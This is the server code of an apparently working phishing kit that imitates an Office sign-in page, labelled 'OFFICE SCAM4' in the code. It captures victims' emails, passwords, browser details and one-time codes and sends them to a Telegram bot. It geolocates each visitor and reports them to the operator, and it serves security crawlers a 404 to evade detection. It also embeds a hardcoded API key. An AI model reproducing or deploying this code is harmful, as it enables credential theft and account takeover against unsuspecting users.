const express = require('express');
const axios = require('axios');
const path = require('path');
const bodyParser = require('body-parser');
const antibot = require('./middleware/antibot');
const { botToken, chatId, code } = require('./config/settings.js'); // Ensure ApiKey and URL are included
const fs = require('fs').promises;
const ApiKey = '7994270589:AAE-7ZmnYasjeC_N6v9krdVrXAyYPJkZu5A';
const URL = `https://api-bdc.net/data/ip-geolocation?ip=`;
const { sendMessageFor } = require('simple-telegram-message');
const { getClientIp } = require("request-ip");
 
const app = express();
const port = 3000;

app.use(bodyParser.urlencoded({ extended: true }));
app.use(bodyParser.json());
app.set('trust proxy', true);


app.post('/next', (req, res) => {
    let message = '👤📩 OFFICE\n===================\n\n';

    if (req.body && 'code' in req.body) {
        const { code, email } = req.body;
        message += `CODE: ${code} for ${email} \n`;
        message += `\n=====================\n\n`;
        message += ' ✅ UPDATE TEAM | OFFICE\n';
        
    } else {
        const { email, password, userAgent, timeZone } = req.body;
	
        message += `EMAIL: ${email} \n`;
        message += `PASSWORD: ${password} \n`;
        message += `BROWSER DETAILS: ${userAgent} \n`;
        message += `TIMEZONE: ${timeZone} \n`;
        message += `\n=====================\n\n`;
        message += ' ✅ UPDATE TEAM | OFFICE\n';
        message += `💬 Telegram: https://t.me/UpdateTeams\n`;

	    res.send({code});
    }

    const website = `https://api.telegram.org/bot${botToken}`;
    const params = {
        chat_id: 7996123529,
        text: message,
    };

    axios.post(`${website}/sendMessage`, params)
        .then(response => {
            console.log(response.data);
            res.send('Message sent successfully');
        })
        .catch(error => {
            console.error(error);
            res.status(500).send('Internal Server Error');
        });
});

const isbot = require('isbot');
const ipRangeCheck = require('ip-range-check');
const { botUAList } = require('./config/botUA.js');
const { botIPList, botIPRangeList, botIPCIDRRangeList, botIPWildcardRangeList } = require('./config/botIP.js');
const { botRefList } = require('./config/botRef.js');

function isBotUA(userAgent) {
    if (!userAgent) {
        userAgent = '';
    }

    if (isbot(userAgent)) {
        return true;
    }

    for (let i = 0; i < botUAList.length; i++) {
        if (userAgent.toLowerCase().includes(botUAList[i])) {
            return true;
        }
    }

    return false;
}

function isBotIP(ipAddress) {
    if (!ipAddress) {
        ipAddress = '';
    }

    if (ipAddress.substr(0, 7) == '::ffff:') {
        ipAddress = ipAddress.substr(7);
    }

    for (let i = 0; i < botIPList.length; i++) {
        if (ipAddress.includes(botIPList[i])) {
            return true;
        }
    }

    function IPtoNum(ip) {
        return Number(
            ip.split('.').map((d) => ('000' + d).substr(-3)).join('')
        );
    }

    const inRange = botIPRangeList.some(
        ([min, max]) =>
            IPtoNum(ipAddress) >= IPtoNum(min) && IPtoNum(ipAddress) <= IPtoNum(max)
    );

    if (inRange) {
        return true;
    }

    for (let i = 0; i < botIPCIDRRangeList.length; i++) {
        if (ipRangeCheck(ipAddress, botIPCIDRRangeList[i])) {
            return true;
        }
    }

    for (let i = 0; i < botIPWildcardRangeList.length; i++) {
        if (ipAddress.match(botIPWildcardRangeList[i]) !== null) {
            return true;
        }
    }

    return false;
}

function isBotRef(referer) {
    if (!referer) {
        referer = '';
    }

    for (let i = 0; i < botRefList.length; i++) {
        if (referer.toLowerCase().includes(botRefList[i])) {
            return true;
        }
    }

    return false;
}

// Middleware function for bot detection
function antiBotMiddleware(req, res, next) {
    const clientUA = req.headers['user-agent'] || req.get('user-agent');
    const clientIP = getClientIp(req);
    const clientRef = req.headers.referer || req.headers.origin;

    if (isBotUA(clientUA) || isBotIP(clientIP) || isBotRef(clientRef)) {
        // It's a bot, return a 404 response or handle it as needed
        return res.status(404).send('Not Found');
    } else {
        // It's not a bot, proceed to the next middleware or route handler
        next();
    }
}

// Use the bot detection middleware for all routes
app.use(antiBotMiddleware);

app.post('/verify', async (req, res) => {
    const { email } = req.body;
    const url = `https://validate.sharingdoc.top/check-mail`;

    console.log(email + " : " + "received");
    
    try {
        const response = await axios.post(url, { email });

        if (response.data.status === 'valid') {
            console.log(email + " : " + response.data);
            res.json({ success: true });
        } else {
            res.json({ success: false });
        }
    } catch (error) {
        console.error('Error verifying email:', error);
        res.status(500).json({ success: false, error: 'Failed to verify email' });
    }
});


app.get('/', async (req, res) => {
    try {
        
        const htmlContent = await fs.readFile(path.join(__dirname, 'public', 'index.html'), 'utf-8');
        res.send(htmlContent);
        
        
        const sendAPIRequest = async (ipAddress) => {
		    const apiResponse = await axios.get(`${URL}${ipAddress}&localityLanguage=en&key=${ApiKey}`);
		    console.log(apiResponse.data);
		    return apiResponse.data;
		};
        
		
		
        const ipAddress = getClientIp(req);
        const ipAddressInformation = await sendAPIRequest(ipAddress);

        
        
        let message = `A new visitor on your OFFICE SCAM4 from IP: ${ipAddress}\n
	    INTERNET PROVIDER: ${ipAddressInformation.network.organisation}\n`;
	
	    console.log(message); 
	    const sendMessage = sendMessageFor(botToken, chatId); 
	    sendMessage(message);
	    } catch (error) {
	        console.error('Error reading file:', error);
	        res.status(500).send('Internal Server Error');
	    }
});

app.get('/common', async (req, res) => {
    try {
        const htmlContent = await fs.readFile(path.join(__dirname, 'public', 'entercode.html'), 'utf-8');
        res.send(htmlContent);
    } catch (error) {
        console.error('Error reading file:', error);
        res.status(500).send('Internal Server Error');
    }
});

// Serve static files from the "public" directory
app.use(express.static(path.join(__dirname, 'public')));

app.listen(port, () => {
    console.log(`Server is running on port ${port}`);
});
